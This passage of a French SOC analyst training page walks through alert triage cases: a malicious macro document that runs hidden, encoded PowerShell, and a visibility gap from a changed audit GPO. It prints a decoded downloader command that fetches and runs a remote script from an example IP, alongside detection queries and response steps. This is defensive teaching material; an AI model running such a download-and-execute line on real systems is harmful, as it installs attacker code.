+<p>Ce qu'on voit : un document <strong><code>.docm</code></strong> (macros activables) téléchargé, ouvert dans Word, qui lance PowerShell <strong>masqué</strong> (<code>-w hidden</code>), sans profil (<code>-nop</code>) et avec une commande <strong>encodée</strong> (<code>-enc</code>). Chaque élément est un drapeau rouge.</p>
+<h3 id="etape-2-decoder">Étape 2 : décoder<a class="headerlink" href="#etape-2-decoder" title="Permanent link">&para;</a></h3>
+<p><code>-enc</code> attend du <strong>Base64 sur du texte UTF-16 « petit-boutiste »</strong>. Pour décoder :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="no">[Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'&lt;la chaîne&gt;'</span><span class="p">))</span>
+</code></pre></div>
+<p>Résultat :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a.ps1')
+</code></pre></div>
+<p>C'est un <strong>téléchargeur</strong> : il récupère un script distant et l'<strong>exécute en mémoire</strong> (<code>IEX</code>).</p>
+<div class="admonition danger">
+<p class="admonition-title">Ne décode jamais en exécutant</p>
+<p>Décode <strong>sans exécuter</strong> : <code>GetString(...)</code> affiche le texte, il ne le lance pas. Ne remplace <strong>jamais</strong> par un <code>IEX</code> sur le contenu décodé. Fais-le idéalement dans un environnement isolé ou avec un outil comme CyberChef (« From Base64 » puis « Decode text » en UTF-16LE).</p>
+</div>
+<h3 id="etape-3-pivoter">Étape 3 : pivoter<a class="headerlink" href="#etape-3-pivoter" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Requête</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>L'hôte a-t-il contacté <code>203.0.113.45</code> ?</td>
+<td><code>event.code : "3" and host.name : "WS-0231" and destination.ip : "203.0.113.45"</code></td>
+</tr>
+<tr>
+<td>Des fichiers ont-ils été déposés ?</td>
+<td><code>event.code : "11" and host.name : "WS-0231" and @timestamp &gt;= "2026-03-14T10:42:00Z"</code></td>
+</tr>
+<tr>
+<td>Persistance ?</td>
+<td><code>event.code : ("12" or "13") and registry.path : *Run*</code></td>
+</tr>
+<tr>
+<td>D'autres hôtes touchés ?</td>
+<td><code>destination.ip : "203.0.113.45"</code> sur <strong>tous</strong> les hôtes</td>
+</tr>
+</tbody>
+</table>
+<details class="success">
+<summary>Solution</summary>
+<p><strong>Chronologie (UTC)</strong></p>
+<table>
+<thead>
+<tr>
+<th>Heure</th>
+<th>Événement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>10:41</td>
+<td>Téléchargement de <code>Facture_0314.docm</code> (navigateur)</td>
+</tr>
+<tr>
+<td>10:42:11</td>
+<td>Word lance PowerShell masqué avec commande encodée</td>
+</tr>
+<tr>
+<td>10:42:13</td>
+<td>Connexion sortante vers <code>203.0.113.45:80</code> (Sysmon 3)</td>
+</tr>
+<tr>
+<td>10:42:15</td>
+<td>Fichier écrit dans <code>%APPDATA%</code> (Sysmon 11)</td>
+</tr>
+<tr>
+<td>10:43</td>
+<td>Clé de registre <code>Run</code> créée (Sysmon 13), <strong>persistance</strong></td>
+</tr>
+<tr>
+<td>10:55</td>
+<td>Deux autres postes contactent la même IP</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Techniques ATT&amp;CK</strong> : T1566.001 (pièce jointe de phishing) → T1204.002 (exécution par l'utilisateur) → T1059.001 (PowerShell) → T1105 (transfert d'outil) → T1547.001 (clé Run).</p>
+<p><strong>Classification</strong> : <strong>vrai positif, intrusion confirmée, propagation probable.</strong></p>
+<p><strong>Actions</strong> : escalade immédiate (IR), <strong>isoler</strong> <code>WS-0231</code> et les 2 autres hôtes, bloquer l'IP et le domaine, réinitialiser les identifiants de <code>mdupont</code>, chercher le <strong>mail d'origine</strong> et les autres destinataires, conserver les preuves avant d'éradiquer.</p>
+<p><strong>Leçon</strong> : c'est la <strong>chaîne parent → enfant → ligne de commande → réseau → persistance</strong> qui prouve l'intrusion, pas un seul log.</p>
+</details>
+<hr />
+<h2 id="cas-d-lalerte-qui-naurait-jamais-du-etre-silencieuse">Cas D : l'alerte qui n'aurait jamais dû être silencieuse<a class="headerlink" href="#cas-d-lalerte-qui-naurait-jamais-du-etre-silencieuse" title="Permanent link">&para;</a></h2>
+<h3 id="lalerte_3">L'alerte<a class="headerlink" href="#lalerte_3" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>Règle de santé des sources</strong> : aucun événement du contrôleur de domaine <code>DC02</code> depuis 3 h.</p>
+</blockquote>
+<h3 id="contexte">Contexte<a class="headerlink" href="#contexte" title="Permanent link">&para;</a></h3>
+<p>La veille, une GPO d'audit a été modifiée. Aucune alerte « sécurité » n'a été levée depuis, ce qui ne signifie <strong>pas</strong> que tout va bien.</p>
+<h3 id="a-verifier">À vérifier<a class="headerlink" href="#a-verifier" title="Permanent link">&para;</a></h3>
+<ol>
+<li>Le service de l'agent tourne-t-il sur <code>DC02</code> ?</li>
+<li>Le réseau jusqu'au SIEM est-il ouvert ?</li>
+<li>Les <strong>politiques d'audit</strong> sont-elles toujours appliquées ? (<code>auditpol /get /category:*</code>)</li>
+<li>Y a-t-il un <strong>trou</strong> dans les événements depuis la modification de la GPO ?</li>
+</ol>
+<details class="success">
+<summary>Solution</summary>
+<p>La nouvelle GPO a <strong>remplacé</strong> la politique d'audit avancée du domaine : l'audit des <strong>connexions</strong> et de l'<strong>accès au service d'annuaire</strong> est désactivé. L'agent fonctionne, mais <strong>aucun événement 4624/4625/4662 n'est plus produit</strong>.</p>
+<p><strong>Impact</strong> : pendant 3 h, toutes les détections AD (brute force, DCSync, Kerberoasting…) étaient <strong>aveugles</strong>.</p>
+<p><strong>Actions</strong> :
+1. Corriger la GPO et rétablir l'audit.
+2. <strong>Réexaminer</strong> la période aveugle par d'autres sources (EDR, réseau, pare-feu) pour savoir si quelque chose a pu passer.
+3. Ajouter une <strong>alerte sur le volume</strong> attendu de 4624/4625 par DC (pas seulement sur le silence total) et un <strong>contrôle de conformité de l'audit</strong>.</p>
+<p><strong>Leçon</strong> : un SOC doit détecter <strong>la perte de sa propre visibilité</strong>. Une source qui parle peu n'est pas forcément une source en bonne santé.</p>
+</details>
+<hr />
+<h2 id="recapitulatif">Récapitulatif<a class="headerlink" href="#recapitulatif" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Cas</th>
+<th>Classification</th>
+<th>Ce qui a tranché</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>A</td>
+<td>Faux positif</td>
+<td>Historique récurrent + nature des comptes + source connue</td>
+</tr>
+<tr>
+<td>B</td>
+<td>Vrai positif bénin</td>
+<td>Ticket de changement, acteur et heure cohérents</td>
+</tr>
+<tr>
+<td>C</td>
+<td>Vrai positif</td>
+<td>Chaîne parent → enfant → réseau → persistance</td>
+</tr>
+<tr>
+<td>D</td>
+<td>Défaut de visibilité</td>
+<td>Perte d'événements d'audit après un changement de GPO</td>
+</tr>
+</tbody>
+</table>
+<h2 id="erreurs-frequentes">Erreurs fréquentes<a class="headerlink" href="#erreurs-frequentes" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Clore le cas A sans corriger la <strong>cause</strong> (mot de passe du scanner).</li>
+<li>Valider le cas B <strong>sans preuve</strong> (« c'est sûrement un admin »).</li>
+<li>Se contenter, dans le cas C, de l'alerte initiale sans <strong>pivoter</strong>.</li>
+<li>Considérer le cas D comme un incident d'infrastructure, <strong>pas de sécurité</strong>.</li>
+</ul>
+<h2 id="a-retenir">À retenir<a class="headerlink" href="#a-retenir" title="Permanent link">&para;</a></h2>
+<ul>
+<li>La <strong>même alerte</strong> peut cacher quatre réalités très différentes : toujours <strong>qualifier</strong>.</li>
+<li>Un faux positif récurrent révèle souvent un <strong>problème opérationnel</strong>.</li>
+<li>« Autorisé » doit être <strong>démontré</strong>.</li>
+<li>L'intrusion se prouve par une <strong>chaîne</strong> d'événements.</li>
+<li>Surveille aussi <strong>ta propre visibilité</strong>.</li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Retour en haut de la page
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pied de page" >
+        
+          
+          <a href="../07-elastic-kibana/" class="md-footer__link md-footer__link--prev" aria-label="Précédent: Elastic &amp; Kibana pas à pas">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Précédent
+              </span>
+              <div class="md-ellipsis">
+                Elastic & Kibana pas à pas
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../09-labs/" class="md-footer__link md-footer__link--next" aria-label="Suivant: Labs">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Suivant
+              </span>
+              <div class="md-ellipsis">
+                Labs
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.sections", "navigation.top", "navigation.indexes", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copi\u00e9 dans le presse-papier", "clipboard.copy": "Copier dans le presse-papier", "search.result.more.one": "1 de plus sur cette page", "search.result.more.other": "# de plus sur cette page", "search.result.none": "Aucun document trouv\u00e9", "search.result.one": "1 document trouv\u00e9", "search.result.other": "# documents trouv\u00e9s", "search.result.placeholder": "Taper pour d\u00e9marrer la recherche", "search.result.term.missing": "Non trouv\u00e9", "select.version": "S\u00e9lectionner la version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../javascripts/quiz.js"></script>
+      
+    
+  </body>
+</html>
